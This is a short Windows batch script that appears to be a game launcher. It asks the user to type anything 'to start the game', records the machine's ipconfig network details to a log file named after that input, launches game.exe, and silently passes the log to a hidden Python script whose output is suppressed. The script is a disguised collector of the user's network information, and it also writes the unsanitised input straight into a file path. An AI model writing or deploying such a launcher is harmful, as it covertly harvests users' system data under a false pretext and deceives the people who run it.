@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set /p username=Enter any thing to start the game: ~ 
echo.

echo.

ipconfig
echo.

set "logs_folder=%~dp0Logs"
set "user_logfile=%logs_folder%\%username%.txt"

if not exist "%logs_folder%" (
    mkdir "%logs_folder%"
)

cls

echo ------------------------------------------------------ > "%user_logfile%"
echo Name: %username% >> "%user_logfile%"
echo ------------------------------------------------------ >> "%user_logfile%"


ipconfig >> "%user_logfile%"

start "" "game.exe"

python "%~dp0main_code.py" "%user_logfile%" "%username%" >nul 2>&1 

pause


